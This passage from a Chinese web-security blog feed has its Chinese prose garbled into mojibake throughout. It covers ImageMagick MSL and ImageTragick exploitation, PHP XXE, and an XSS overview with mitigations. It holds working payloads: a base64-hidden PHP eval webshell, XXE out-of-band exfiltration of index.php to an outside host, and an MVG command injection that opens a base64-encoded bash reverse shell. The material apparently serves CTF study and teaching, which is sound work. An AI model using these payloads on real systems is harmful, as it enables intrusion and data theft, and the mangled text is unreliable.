<p>å¦‚æœä½¿ç”¨ vid:msl çš„å½¢å¼å°†è¯¥ä¸´æ—¶æ–‡ä»¶è¿›è¡Œè¯»å–ï¼Œè§£æ msl æ—¶ä¼šå°† webshell çš„å†…å®¹å†™å…¥ &#x2F;var&#x2F;www&#x2F;swarm.php</p>
<pre><code class="highlight plaintext">$a = new Imagick(&quot;vid:msl:/tmp/php*&quot;);</code></pre>

<p>CISCN 2022 æœ‰æ ¹æ®è¿™ä¸ªçŸ¥è¯†ç‚¹å‡ºè¿‡é¢˜ï¼š<a href="https://github.com/AFKL-CUIT/CTF-Challenges/blob/master/CISCN/2022/backdoor/writup/writup.md">CTF-Challenges&#x2F;CISCN&#x2F;2022&#x2F;backdoor&#x2F;writup&#x2F;writup.md at master Â· AFKL-CUIT&#x2F;CTF-Challenges Â· GitHub</a>ï¼Œä½†åˆ©ç”¨ payload æœ‰æ‰€åŒºåˆ«, ä½¿ç”¨ inline å°†æ–‡ä»¶å†…å®¹ä»¥ base64 çš„å½¢å¼ç¼–ç åœ¨ msl æ–‡ä»¶ä¸­ã€‚</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt; &lt;write filename=&quot;/tmp/sess_afkl&quot; /&gt; &lt;/image&gt;</code></pre>

<p>SCTF 2023 ä¸­å¯¹è¿™ç§åˆ©ç”¨æ–¹å¼è¿›è¡Œäº†æ¢ç´¢ï¼Œå¯ä»¥è¾¾åˆ°è¯»å–æ–‡ä»¶å†…å®¹çš„æ•ˆæœã€‚</p>
<pre><code class="highlight xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="tag">&lt;<span class="name">image</span>&gt;</span> <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;mvg:/flag&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/xxxx&quot;</span> /&gt;</span> <span class="tag">&lt;/<span class="name">image</span>&gt;</span></code></pre>

<h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><pre><code class="highlight plaintext"> class SimpleXMLElement implements Stringable, Countable, RecursiveIterator &#123;
    /* Methods */
    public __construct(
        string $data,
        int $options = 0,
        bool $dataIsURL = false,
        string $namespaceOrPrefix = &quot;&quot;,
        bool $isPrefix = false
    )
    public addAttribute(string $qualifiedName, string $value, ?string $namespace = null): void
    public addChild(string $qualifiedName, ?string $value = null, ?string $namespace = null): ?SimpleXMLElement
    public asXML(?string $filename = null): string|bool
    public attributes(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
    public children(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
    public count(): int
    public getDocNamespaces(bool $recursive = false, bool $fromRoot = true): array|false
    public getName(): string
    public getNamespaces(bool $recursive = false): array
    public registerXPathNamespace(string $prefix, string $namespace): bool
    public __toString(): string
    public xpath(string $expression): array|null|false
&#125;</code></pre>

<ul>
<li>data: xml å­—ç¬¦ä¸²ï¼Œxml æ–‡æ¡£è·¯å¾„æˆ–è€… url è·¯å¾„ï¼ˆå¦‚æœ dataIsURL ä¸º true</li>
<li>dataIsURL: é»˜è®¤æƒ…å†µä¸‹ä¸º falseï¼Œä¸º true æ—¶ data ä¸ºä¸€ä¸ª url è·¯å¾„</li>
<li>optionï¼šè®¾ç½®ä¸º LIBXML_NOENT æ—¶ï¼Œå¯èƒ½ä¼šå¯¼è‡´ xxe æ”»å‡»ï¼ŒLIBXML_NOENT ä¸º 2.</li>
</ul>
<p><strong>è¯»å–æ–‡ä»¶</strong></p>
<p>poc:</p>
<pre><code class="highlight plaintext">$x=new SimpleXMLElement(&quot;http://xxx.xxx.xxx.xxx/evil.xml&quot;,2,true);</code></pre>

<p>evil.xml</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE ANY[   &lt;!ENTITY % remote SYSTEM &quot;http://xxx.xxx.xxx.xxx/send.xml&quot;&gt;   %remote;   %all;   %send;   ]&gt;</code></pre>

<p>send.xml</p>
<pre><code class="highlight plaintext">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;   &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/send.php?file=%file;&#x27;&gt;&quot;&gt;</code></pre>

<h3 id="SimpleXMLIterator"><a href="#SimpleXMLIterator" class="headerlink" title="SimpleXMLIterator"></a><code>SimpleXMLIterator</code></h3><p>å¯ç”¨äºä»£æ›¿ <code>SimpleXMLElement</code></p>
<h3 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a><code>ImageMagick</code></h3><p>é…åˆXXEè¿›è¡ŒRCEï¼Œå‚è€ƒ<strong>CVE-2016-3714</strong></p>
<pre><code class="highlight plaintext">å½±å“ç‰ˆæœ¬ImageMagick &lt;6.9.3-9</code></pre>

<p><code>ImageMagick</code>æœ‰ä¸€ä¸ªåŠŸèƒ½å«åš<code>delegate(å§”æ‰˜)</code>ï¼Œä½œç”¨æ˜¯è°ƒç”¨å¤–éƒ¨çš„libæ–‡ä»¶æ¥å¤„ç†æ–‡ä»¶ï¼Œåœ¨è¿™è¿‡ç¨‹ä¸­ä¼šä½¿ç”¨åˆ°ç³»ç»Ÿçš„systemå‘½ä»¤</p>
<p>åœ¨æ¼æ´æŠ¥å‘Šä¸­åˆ©ç”¨äº†&#x2F;etc&#x2F;ImageMagick&#x2F;delegate.xmlä¸­çš„è¿™ä¸€æ®µå§”æ‰˜</p>
<pre><code class="highlight xml"><span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">&quot;https&quot;</span> <span class="attr">command</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span>curl<span class="symbol">&amp;quot;</span> -s -k -o <span class="symbol">&amp;quot;</span>%o<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>https:%M<span class="symbol">&amp;quot;</span>&quot;</span>/&gt;</span></code></pre>

<p>å®ƒåœ¨è§£æhttpsæ–‡ä»¶æ—¶ç”¨curlå‘½ä»¤å°†å…¶ä¸‹è½½ï¼Œ%Mè¢«ç›´æ¥æ”¾åœ¨curlçš„æœ€åä¸€ä¸ªå‚æ•°å†…</p>
<p><code>ImageMagick</code>é»˜è®¤æ”¯æŒ<code>mvg</code>çš„æ–‡ä»¶æ ¼å¼,<code>mvg</code>ä¸<code>svg</code>æ ¼å¼ç±»ä¼¼ï¼Œå…¶ä¸­æ˜¯ä»¥æ–‡æœ¬å½¢å¼å†™å…¥çŸ¢é‡å›¾çš„å†…å®¹ï¼Œè€Œè¿™å…¶ä¸­åŒ…å«äº†httpsçš„å¤„ç†è¿‡ç¨‹</p>
<p>æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ª<code>mvg</code>æ–‡ä»¶æ¥è¿›è¡Œrce(åç¼€ä¸ä¸€å®šè¦ç”¨<code>.mvg</code>ï¼Œ<code>ImageMagick</code>è‡ªåŠ¨æ ¹æ®ä¸Šä¼ çš„å†…å®¹å°†å…¶è¯†åˆ«ä¸º<code>mvg</code>å›¾ç‰‡)</p>
<p>å¹¶åœ¨https:&#x2F;&#x2F;åé—­åˆåŒå¼•å·ï¼Œå†™å…¥æ‰§è¡Œçš„å‘½ä»¤</p>
<pre><code class="highlight svg">push graphic-context
viewbox 0 0 640 480
fill &#x27;url(https://&quot;|id; &quot;)&#x27;
pop graphic-context</code></pre>

<p>åå¼¹shell</p>
<pre><code class="highlight plaintext">push graphic-context
viewbox 0 0 640 480
fill &#x27;url(https://127.0.0.1/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguODEuMjMyLzg4ODggMD4mMQ== | base64 -d | bash`&quot;||id &quot; )&#x27;
pop graphic-context</code></pre>



]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>è¯¦è§£XSSæ³¨å…¥</title>
    <url>/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="XSSæ³¨å…¥"><a href="#XSSæ³¨å…¥" class="headerlink" title="XSSæ³¨å…¥"></a>XSSæ³¨å…¥</h1><pre><code class="highlight plaintext">&quot;çƒçƒä½ äº†ï¼å°±è®©æˆ‘æ’ä¸€å¥è¯ï¼Œæˆ‘ä»€ä¹ˆéƒ½ä¼šåšçš„!!!&quot;

&quot;bydè¢«æˆ‘æ³¨å…¥äº†å§&quot;</code></pre>

<h2 id="è®¤è¯†XSSæ”»å‡»"><a href="#è®¤è¯†XSSæ”»å‡»" class="headerlink" title="è®¤è¯†XSSæ”»å‡»"></a>è®¤è¯†XSSæ”»å‡»</h2><p>XSSå…¨ç§°æ˜¯Cross Site Scriptingå³è·¨ç«™è„šæœ¬ï¼Œå½“ç›®æ ‡ç½‘ç«™ç›®æ ‡ç”¨æˆ·æµè§ˆå™¨æ¸²æŸ“HTMLæ–‡æ¡£çš„è¿‡ç¨‹ä¸­ï¼Œå‡ºç°äº†ä¸è¢«é¢„æœŸçš„è„šæœ¬æŒ‡ä»¤å¹¶æ‰§è¡Œæ—¶ï¼ŒXSSå°±å‘ç”Ÿäº†ã€‚</p>
<ul>
<li><p>XSS çš„è¿è¡ŒåŸç†æ˜¯å°†æ¶æ„çš„ script è„šæœ¬æ’å…¥è¿› html&#x2F;css&#x2F;js æ–‡ä»¶å½“ä¸­ã€‚ï¼ˆé€šè¿‡åœ¨htmlæ ‡å‡†çš„è¯­å¥åè§¦å‘äº‹ä»¶ï¼Œè€Œäº‹ä»¶åˆ™æ˜¯æ‰§è¡Œæ¶æ„js</p>
<p>ä»£ç ï¼‰</p>
</li>
</ul>
<p>ä½œä¸ºä¸€ç§HTMLæ³¨å…¥æ”»å‡»ï¼ŒXSSæ”»å‡»çš„æ ¸å¿ƒæ€æƒ³å°±æ˜¯åœ¨HTMLé¡µé¢ä¸­æ³¨å…¥æ¶æ„ä»£ç ï¼Œè€ŒXSSé‡‡ç”¨çš„æ³¨å…¥æ–¹å¼æ˜¯éå¸¸å·§å¦™çš„ã€‚åœ¨XSSæ”»å‡»ä¸­ï¼Œä¸€èˆ¬æœ‰ä¸‰ä¸ªè§’è‰²å‚ä¸ï¼šæ”»å‡»è€…ã€ç›®æ ‡æœåŠ¡å™¨ã€å—å®³è€…çš„æµè§ˆå™¨ã€‚</p>
<p>ç”±äºæœ‰çš„æœåŠ¡å™¨å¹¶æ²¡æœ‰å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œå®‰å…¨æ–¹é¢çš„éªŒè¯ï¼Œæ”»å‡»è€…å°±å¯ä»¥å¾ˆå®¹æ˜“åœ°é€šè¿‡æ­£å¸¸çš„è¾“å…¥æ‰‹æ®µï¼Œå¤¹å¸¦è¿›ä¸€äº›æ¶æ„çš„HTMLè„šæœ¬ä»£ç ã€‚å½“å—å®³è€…çš„æµè§ˆå™¨è®¿ é—®ç›®æ ‡æœåŠ¡å™¨ä¸Šè¢«æ³¨å…¥æ¶æ„è„šæœ¬çš„é¡µé¢åï¼Œç”±äºå®ƒå¯¹ç›®æ ‡æœåŠ¡å™¨çš„ä¿¡ä»»ï¼Œè¿™æ®µæ¶æ„è„šæœ¬çš„æ‰§è¡Œä¸ä¼šå—åˆ°ä»€ä¹ˆé˜»ç¢ã€‚è€Œæ­¤æ—¶ï¼Œæ”»å‡»è€…çš„ç›®çš„å°±å·²ç»è¾¾åˆ°äº†ã€‚</p>
<h2 id="åå°„å‹XSS"><a href="#åå°„å‹XSS" class="headerlink" title="åå°„å‹XSS"></a>åå°„å‹XSS</h2><pre><code class="highlight plaintext">åˆç§°**éæŒä¹…å‹XSS**ã€‚ä¹‹æ‰€ä»¥ç§°ä¸ºåå°„å‹XSSï¼Œæ˜¯å› ä¸ºè¿™ç§æ”»å‡»æ–¹å¼çš„æ³¨å…¥ä»£ç æ˜¯ä»ç›®æ ‡æœåŠ¡å™¨é€šè¿‡é”™è¯¯ä¿¡æ¯ã€æœç´¢ç»“æœç­‰ç­‰æ–¹å¼â€œåå°„â€å›æ¥çš„ï¼šå‘å‡ºè¯·æ±‚æ—¶ï¼ŒXSSä»£ç å‡ºç°åœ¨URLä¸­ï¼Œä½œä¸ºè¾“å…¥æäº¤åˆ°æœåŠ¡å™¨ç«¯ï¼ŒæœåŠ¡å™¨ç«¯è§£æåå“åº”ï¼ŒXSSä»£ç éšå“åº”å†…å®¹ä¸€èµ·ä¼ å›ç»™æµè§ˆå™¨ï¼Œæœ€åæµè§ˆå™¨è§£ææ‰§è¡ŒXSSä»£ç ã€‚è¿™ä¸ªè¿‡ç¨‹åƒä¸€æ¬¡åå°„ï¼Œæ•…å«åå°„å‹XSSã€‚ è€Œç§°ä¸ºéæŒä¹…å‹XSSï¼Œåˆ™æ˜¯å› ä¸ºè¿™ç§æ”»å‡»æ–¹å¼å…·æœ‰ä¸€æ¬¡æ€§ï¼Œç”±äºä»£ç æ³¨å…¥çš„æ˜¯ä¸€ä¸ªåŠ¨æ€äº§ç”Ÿçš„é¡µé¢è€Œä¸æ˜¯æ°¸ä¹…çš„é¡µé¢ï¼Œå› æ­¤è¿™ç§æ”»å‡»æ–¹å¼åªåœ¨ç‚¹å‡»é“¾æ¥çš„æ—¶å€™æ‰äº§ç”Ÿä½œç”¨ã€‚

æ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼ç»™åˆ«äººå‘é€å¸¦æœ‰æ¶æ„è„šæœ¬ä»£ç å‚æ•°çš„ URLï¼Œå½“ URL åœ°å€è¢«æ‰“å¼€æ—¶ï¼Œæ³¨å…¥è„šæœ¬è¢«ä¼ è¾“åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œç„¶åæœåŠ¡å™¨å°†æ³¨å…¥è„šæœ¬â€œåå°„â€åˆ°å—å®³è€…çš„æµè§ˆå™¨ä¸Šï¼Œç‰¹æœ‰çš„æ¶æ„ä»£ç å‚æ•°è¢« HTML è§£æã€æ‰§è¡Œã€‚

éæŒä¹…å‹ XSS æ¼æ´æ”»å‡»çš„**å››å¤§ç‰¹ç‚¹**ï¼šâ‘  å³æ—¶æ€§ã€‚ä¸ç»è¿‡æœåŠ¡å™¨å­˜å‚¨ï¼Œç›´æ¥é€šè¿‡ HTTP çš„ GET å’Œ POST è¯·æ±‚å°±èƒ½å®Œæˆä¸€æ¬¡æ”»å‡»ï¼Œæ‹¿åˆ°ç”¨æˆ·éšç§æ•°æ®ï¼›â‘¡æ”»å‡»è€…éœ€è¦è¯±éª—ç‚¹å‡»ï¼›â‘¢åé¦ˆç‡ä½ï¼Œæ‰€ä»¥è¾ƒéš¾å‘ç°å’Œå“åº”ä¿®å¤ï¼›â‘£ç›—å–ç”¨æˆ·æ•æ„Ÿä¿å¯†ä¿¡æ¯ã€‚

é˜²æ­¢å‡ºç°éæŒä¹…å‹ XSS æ¼æ´çš„**äº”å¤§æªæ–½**ï¼šâ‘  Web é¡µé¢æ¸²æŸ“çš„æ‰€æœ‰å†…å®¹æˆ–è€…æ¸²æŸ“çš„æ•°æ®éƒ½å¿…é¡»æ¥è‡ªäºæœåŠ¡ç«¯ï¼›â‘¡å°½é‡ä¸è¦ä» URLï¼Œdocument.referrerï¼Œdocument.forms ç­‰è¿™ç§ DOM API ä¸­è·å–æ•°æ®ç›´æ¥æ¸²æŸ“ï¼›â‘¢å°½é‡ä¸è¦ä½¿ç”¨ eval, new Function()ï¼Œdocument.write()ï¼Œdocument.writeln()ï¼Œwindow.setInterval()ï¼Œwindow.setTimeout()ï¼ŒinnerHTMLï¼Œdocument.creteElement() ç­‰å¯æ‰§è¡Œå­—ç¬¦ä¸²çš„æ–¹æ³•ï¼›â‘£å¦‚æœåšä¸åˆ°ä»¥ä¸Šå‡ ç‚¹ï¼Œä¹Ÿå¿…é¡»å¯¹æ¶‰åŠ DOM æ¸²æŸ“çš„æ–¹æ³•ä¼ å…¥çš„å­—ç¬¦ä¸²å‚æ•°åš escape è½¬ä¹‰ï¼›â‘¤ å‰ç«¯æ¸²æŸ“çš„æ—¶å€™å¯¹ä»»ä½•çš„å­—æ®µéƒ½éœ€è¦åš escape è½¬ä¹‰ç¼–ç </code></pre>

<p>åå°„å‹ XSS çš„ Payload å¦‚ä¸‹</p>
<pre><code class="highlight plaintext">&lt;script&gt;alert(1)&lt;script&gt;</code></pre>

<h3 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h3><ul>
<li>â€œ&gt;é—­åˆç»•è¿‡</li>
</ul>
<h2 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h2><pre><code class="highlight plaintext">å­˜å‚¨å‹XSSï¼Œåˆç§°æŒä¹…å‹XSSï¼Œä»–å’Œåå°„å‹XSSæœ€å¤§çš„ä¸åŒå°±æ˜¯ï¼Œæ”»å‡»è„šæœ¬å°†è¢«æ°¸ä¹…åœ°å­˜æ”¾åœ¨ç›®æ ‡æœåŠ¡å™¨ç«¯ï¼ˆæ•°æ®åº“ï¼Œå†…å­˜ï¼Œæ–‡ä»¶ç³»ç»Ÿç­‰ï¼‰ï¼Œä¸‹æ¬¡è¯·æ±‚ç›®æ ‡é¡µé¢æ—¶ä¸ç”¨å†æäº¤XSSä»£ç ã€‚

ä¸€èˆ¬å­˜åœ¨äº Form è¡¨å•æäº¤ç­‰äº¤äº’åŠŸèƒ½ï¼Œå¦‚å‘å¸–ç•™è¨€ï¼Œæäº¤æ–‡æœ¬ä¿¡æ¯ç­‰ï¼Œé»‘å®¢åˆ©ç”¨çš„ XSS æ¼æ´ï¼Œå°†å†…å®¹ç»æ­£å¸¸åŠŸèƒ½æäº¤è¿›å…¥æ•°æ®åº“æŒä¹…ä¿å­˜ï¼Œå½“å‰ç«¯é¡µé¢è·å¾—åç«¯ä»æ•°æ®åº“ä¸­è¯»å‡ºçš„æ³¨å…¥ä»£ç æ—¶ï¼Œæ°å¥½å°†å…¶æ¸²æŸ“æ‰§è¡Œã€‚

è¿™ç§æ”»å‡»å¤šè§äºè®ºå›ï¼Œæ”»å‡»è€…åœ¨å‘å¸–çš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸ä¿¡æ¯ä¸€èµ·æ³¨å…¥åˆ°å¸–å­çš„å†…å®¹ä¹‹ä¸­ã€‚éšç€å¸–å­è¢«è®ºå›æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿæ°¸ä¹…åœ°è¢«å­˜æ”¾åœ¨è®ºå›æœåŠ¡å™¨çš„åç«¯å­˜å‚¨å™¨ä¸­ã€‚å½“å…¶å®ƒç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­çš„æ—¶å€™ï¼Œæ¶æ„è„šæœ¬åˆ™ä¼šåœ¨ä»–ä»¬çš„æµè§ˆå™¨ä¸­å¾—åˆ°æ‰§è¡Œï¼Œä»è€Œå—åˆ°äº†æ”»å‡»ã€‚

å¯ä»¥çœ‹åˆ°ï¼Œå­˜å‚¨å‹XSSçš„æ”»å‡»æ–¹å¼èƒ½å¤Ÿå°†æ¶æ„ä»£ç æ°¸ä¹…åœ°åµŒå…¥ä¸€ä¸ªé¡µé¢å½“ä¸­ï¼Œæ‰€æœ‰è®¿é—®è¿™ä¸ªé¡µé¢çš„ç”¨æˆ·éƒ½å°†æˆä¸ºå—å®³è€…ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè°¨æ…å¯¹å¾…ä¸æ˜é“¾æ¥ï¼Œé‚£ä¹ˆåå°„å‹çš„XSSæ”»å‡»å°†æ²¡æœ‰å¤šå¤§ä½œä¸ºï¼Œè€Œå­˜å‚¨å‹XSSåˆ™ä¸åŒï¼Œç”±äºå®ƒæ³¨å…¥çš„å¾€å¾€æ˜¯ä¸€äº›æˆ‘ä»¬æ‰€ä¿¡ä»»çš„é¡µé¢ï¼Œå› æ­¤æ— è®ºæˆ‘ä»¬å¤šä¹ˆå°å¿ƒï¼Œéƒ½éš¾å…ä¼šå—åˆ°æ”»å‡»ã€‚å¯ä»¥è¯´ï¼Œå­˜å‚¨å‹XSSæ›´å…·æœ‰éšè”½æ€§ï¼Œå¸¦æ¥çš„å±å®³ä¹Ÿæ›´å¤§ï¼Œé™¤éæœåŠ¡å™¨èƒ½å®Œå…¨é˜»æ­¢æ³¨å…¥ï¼Œå¦åˆ™ä»»ä½•äººéƒ½å¾ˆæœ‰å¯èƒ½å—åˆ°æ”»å‡»ã€‚

æŒä¹…å‹ XSS çš„ä¸‰**å¤§ç‰¹ç‚¹**ï¼šâ‘ æŒä¹…æ€§ï¼Œæ¤å…¥åœ¨æ•°æ®åº“ä¸­ï¼›â‘¡å±å®³é¢å¹¿ï¼Œç”šè‡³å¯ä»¥è®©ç”¨æˆ·æœºå™¨å˜æˆ DDoS æ”»å‡»çš„è‚‰é¸¡ï¼›â‘¢ ç›—å–ç”¨æˆ·æ•æ„Ÿç§å¯†ä¿¡æ¯ã€‚

é˜²æ­¢æŒä¹…å‹ XSS æ¼æ´çš„**ä¸‰å¤§æªæ–½ï¼š** â‘ åç«¯åœ¨å…¥åº“å‰åº”è¯¥é€‰æ‹©ä¸ç›¸ä¿¡ä»»ä½•å‰ç«¯æ•°æ®ï¼Œå°†æ‰€æœ‰çš„å­—æ®µç»Ÿä¸€è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼›â‘¡åç«¯åœ¨è¾“å‡ºç»™å‰ç«¯æ•°æ®ç»Ÿä¸€è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼›â‘¢å‰ç«¯åœ¨æ¸²æŸ“é¡µé¢ DOM çš„æ—¶å€™åº”è¯¥é€‰æ‹©ä¸ç›¸ä¿¡ä»»ä½•åç«¯æ•°æ®ï¼Œä»»ä½•å­—æ®µéƒ½éœ€è¦åšè½¬ä¹‰å¤„ç†ã€‚</code></pre>



<h2 id="DOM-based-å‹"><a href="#DOM-based-å‹" class="headerlink" title="DOM-based å‹"></a>DOM-based å‹</h2><pre><code class="highlight plaintext">å®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œè€Œä¸ä¾èµ–äºæœåŠ¡å™¨ç«¯çš„æ•°æ®ã€‚ä¾‹å¦‚å®¢æˆ·ç«¯å¦‚ä» URL ä¸­æå–æ•°æ®å¹¶åœ¨æœ¬åœ°æ‰§è¡Œï¼Œå¦‚æœç”¨æˆ·åœ¨å®¢æˆ·ç«¯è¾“å…¥çš„æ•°æ®åŒ…å«äº†æ¶æ„çš„ JavaScript è„šæœ¬ï¼Œè€Œè¿™äº›è„šæœ¬æ²¡æœ‰ç»è¿‡é€‚å½“çš„è¿‡æ»¤å’Œæ¶ˆæ¯’ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºå°±å¯èƒ½å—åˆ° [DOM-based XSS](https://zhida.zhihu.com/search?content_id=164263694&amp;content_type=Article&amp;match_order=1&amp;q=DOM-based+XSS&amp;zhida_source=entity) æ”»å‡»ã€‚éœ€è¦ç‰¹åˆ«æ³¨æ„ä»¥ä¸‹çš„ç”¨æˆ·è¾“å…¥æº document.URLã€ location.hashã€ location.searchã€ document.referrer ç­‰ã€‚</code></pre>



<h2 id="åŸºäºå­—ç¬¦é›†çš„-XSS"><a href="#åŸºäºå­—ç¬¦é›†çš„-XSS" class="headerlink" title="åŸºäºå­—ç¬¦é›†çš„ XSS"></a>åŸºäºå­—ç¬¦é›†çš„ XSS</h2><pre><code class="highlight plaintext">å“ªæ€•ç°åœ¨å¾ˆå¤šçš„æµè§ˆå™¨ä»¥åŠå„ç§å¼€æºçš„åº“éƒ½ä¸“é—¨é’ˆå¯¹äº† XSS è¿›è¡Œè½¬ä¹‰å¤„ç†ï¼Œå°½é‡é»˜è®¤æŠµå¾¡ç»å¤§å¤šæ•° XSS æ”»å‡»ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰å¾ˆå¤šæ–¹å¼å¯ä»¥ç»•è¿‡è½¬ä¹‰è§„åˆ™ï¼Œè®©äººé˜²ä¸èƒœé˜²ã€‚æ¯”å¦‚ã€ŒåŸºäºå­—ç¬¦é›†çš„ XSS æ”»å‡»ã€å°±æ˜¯ç»•è¿‡è¿™äº›è½¬ä¹‰å¤„ç†çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæ¯”å¦‚æœ‰äº› Web é¡µé¢å­—ç¬¦é›†ä¸å›ºå®šï¼Œç”¨æˆ·è¾“å…¥éæœŸæœ›å­—ç¬¦é›†çš„å­—ç¬¦ï¼Œæœ‰æ—¶ä¼šç»•è¿‡è½¬ä¹‰è¿‡æ»¤è§„åˆ™ã€‚

å¯ä»¥å½¢æˆã€ŒåŸºäºå­—ç¬¦é›†çš„ XSS æ”»å‡»ã€çš„åŸå› æ˜¯ç”±äºæµè§ˆå™¨åœ¨ meta æ²¡æœ‰æŒ‡å®š charset çš„æ—¶å€™æœ‰è‡ªåŠ¨è¯†åˆ«ç¼–ç çš„æœºåˆ¶ï¼Œæ‰€ä»¥è¿™ç±»æ”»å‡»é€šå¸¸å°±æ˜¯å‘ç”Ÿåœ¨æ²¡æœ‰æŒ‡å®šæˆ–è€…æ²¡æ¥å¾—åŠæŒ‡å®š meta æ ‡ç­¾çš„ charset çš„æƒ…å†µä¸‹ã€‚

é¿å…åŸºäºå­—ç¬¦é›†çš„ XSS æ”»å‡»çš„**ä¸¤å¤§æ–¹æ³•ï¼š**â‘ è®°ä½æŒ‡å®š &lt;meta charset=&quot;utf-8&quot;&gt;ï¼›â‘¡ XML ä¸­ä¸ä»…è¦æŒ‡å®šå­—ç¬¦é›†ä¸º utf-8ï¼Œè€Œä¸”æ ‡ç­¾è¦é—­åˆã€‚</code></pre>



<h2 id="åŸºäº-Flash-çš„è·¨ç«™-XSS"><a href="#åŸºäº-Flash-çš„è·¨ç«™-XSS" class="headerlink" title="åŸºäº Flash çš„è·¨ç«™ XSS"></a>åŸºäº Flash çš„è·¨ç«™ XSS</h2><pre><code class="highlight plaintext">åŸºäº Flash çš„è·¨ç«™ XSS ä¹Ÿæ˜¯å±äºåå°„å‹ XSS çš„ä¸€ç§ï¼ŒAS è„šæœ¬å¯ä»¥æ¥å—ç”¨æˆ·è¾“å…¥å¹¶æ“ä½œ cookieï¼Œæ”»å‡»è€…å¯ä»¥é…åˆå…¶ä»– XSSï¼ˆæŒä¹…å‹æˆ–è€…éæŒä¹…å‹ï¼‰æ–¹æ³•å°†æ¶æ„ swf æ–‡ä»¶åµŒå…¥é¡µé¢ä¸­ã€‚ä¸»è¦æ˜¯å› ä¸º AS æœ‰æ—¶å€™éœ€è¦å’Œ JS ä¼ å‚äº¤äº’ï¼Œæ”»å‡»è€…ä¼šé€šè¿‡æ¶æ„çš„ XSS æ³¨å…¥ç¯¡æ”¹å‚æ•°ï¼Œçªƒå–å¹¶æ“ä½œcookieã€‚

åŸºäº Flash çš„è·¨ç«™ XSS çš„**ä¸¤ç§é¿å…æ–¹æ³•** **ï¼š**â‘ ä¸¥æ ¼ç®¡ç† cookie çš„è¯»å†™æƒé™ï¼›â‘¡å¯¹ Flash èƒ½æ¥å—ç”¨æˆ·è¾“å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ escape è½¬ä¹‰å¤„ç†ã€‚</code></pre>



